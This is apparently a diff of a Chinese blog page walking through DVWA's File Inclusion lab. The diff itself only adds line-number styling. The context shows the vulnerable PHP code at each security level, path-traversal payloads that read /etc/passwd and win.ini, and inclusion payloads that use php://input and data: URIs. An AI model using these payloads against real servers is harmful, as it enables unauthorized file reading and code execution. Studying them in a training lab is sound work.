@@ -29,7 +29,8 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
 
 
 
@@ -546,12 +547,12 @@
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Low.png" alt="SecurityLevel_Low"></center>
 
 <p><strong>服务器端核心代码</strong>：</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 
 <span class="token comment" spellcheck="true">// The page we wish to display</span>
 <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'page'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
 
-<span class="token delimiter">?></span> </code></pre>
+<span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <ul>
 <li>代码直接读取 page 参数同时使用 include 进行文件包含执行  </li>
 </ul>
@@ -559,8 +560,8 @@
 <ul>
 <li>使用浏览器发起本地文件包含攻击，payload：</li>
 </ul>
-<pre class=" language-php"><code class="language-php"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>etc<span class="token operator">/</span>password
-c<span class="token punctuation">:</span>\<span class="token package"><span class="token punctuation">\</span>windows<span class="token punctuation">\</span>win</span><span class="token punctuation">.</span>ini</code></pre>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>etc<span class="token operator">/</span>password
+c<span class="token punctuation">:</span>\<span class="token package"><span class="token punctuation">\</span>windows<span class="token punctuation">\</span>win</span><span class="token punctuation">.</span>ini<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileInclusion/本地文件包含-low.png" alt="本地文件包含-low"></center>
 
 <ul>
@@ -578,7 +579,7 @@ c<span class="token punctuation">:</span>\<span class="token package"><span clas
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Medium.png" alt="SecurityLevel_Medium"></center>
 
 <p><strong>服务器端核心代码</strong>：</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 
 <span class="token comment" spellcheck="true">// The page we wish to display</span>
 <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'page'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -587,7 +588,7 @@ c<span class="token punctuation">:</span>\<span class="token package"><span clas
 <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token keyword">array</span><span class="token punctuation">(</span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//", "https://" ), "", $file );</span>
 <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token keyword">array</span><span class="token punctuation">(</span> <span class="token string">"../"</span><span class="token punctuation">,</span> <span class="token string">"..\""</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="token delimiter">?></span> </code></pre>
+<span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <ul>
 <li>清除 page 参数中的 <code>http://、 https://、 ../、 ..\</code>字符串, 可以使用 <code>php://input</code>， <code>php://filter</code>,<br><code>data url schema</code>等进行注入，也可使用替换逻辑漏洞(只替换一次)将被替换字符串迭代使用，例如 <code>hthttp://tp://</code>被替换后为<code>http://</code> </li>
 </ul>
@@ -595,14 +596,14 @@ c<span class="token punctuation">:</span>\<span class="token package"><span clas
 <ul>
 <li>使用浏览器发起本地文件包含攻击，payload：</li>
 </ul>
-<pre class=" language-php"><code class="language-php">…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>etc<span class="token operator">/</span>password
-…<span class="token punctuation">.</span><span class="token comment" spellcheck="true">//….//….//….//….//….//….//….//….//….//etc/password</span></code></pre>
+<pre class="line-numbers language-php"><code class="language-php">…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>etc<span class="token operator">/</span>password
+…<span class="token punctuation">.</span><span class="token comment" spellcheck="true">//….//….//….//….//….//….//….//….//….//etc/password</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <ul>
 <li>使用浏览器发起远程文件包含攻击，payload：</li>
 </ul>
-<pre class=" language-php"><code class="language-php">hthttp<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//tp://localhost:9999/file_include_low.php</span>
+<pre class="line-numbers language-php"><code class="language-php">hthttp<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//tp://localhost:9999/file_include_low.php</span>
 php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input &lt;?php phpinfo();</span>
-data<span class="token punctuation">:</span>text<span class="token operator">/</span>plain<span class="token punctuation">;</span>charset<span class="token operator">=</span>utf<span class="token number">-8</span><span class="token punctuation">,</span><span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+data<span class="token punctuation">:</span>text<span class="token operator">/</span>plain<span class="token punctuation">;</span>charset<span class="token operator">=</span>utf<span class="token number">-8</span><span class="token punctuation">,</span><span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileInclusion/远程文件包含php.png" alt="远程文件包含php"></center>
 
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileInclusion/远程文件包含-文件头.png" alt="远程文件包含-文件头"></center>
@@ -613,7 +614,7 @@ data<span class="token punctuation">:</span>text<span class="token operator">/</
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_High.png" alt="SecurityLevel_High"></center>
 
 <p><strong>服务器端核心代码</strong>：</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 
 <span class="token comment" spellcheck="true">// The page we wish to display</span>
 <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'page'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -625,7 +626,7 @@ data<span class="token punctuation">:</span>text<span class="token operator">/</
     exit<span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 
-<span class="token delimiter">?></span> </code></pre>
+<span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <ul>
 <li>对提交参数进行检查，只允许<code>include.php</code>以及 <code>file</code>开头的文件被包含，只能包含本地<code>file</code>开头的文件或配合文件上传漏洞组合进行利用  </li>
 </ul>
@@ -633,7 +634,7 @@ data<span class="token punctuation">:</span>text<span class="token operator">/</
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Impossible.png" alt="SecurityLevel_Impossible"></center>
 
 <p><strong>服务器端核心代码</strong>：</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 
 <span class="token comment" spellcheck="true">// The page we wish to display</span>
 <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'page'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -645,7 +646,7 @@ data<span class="token punctuation">:</span>text<span class="token operator">/</
     exit<span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 
-<span class="token delimiter">?></span> </code></pre>
+<span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <ul>
 <li>使用白名单，防止文件包含执行除此以外的文件。</li>
 </ul>
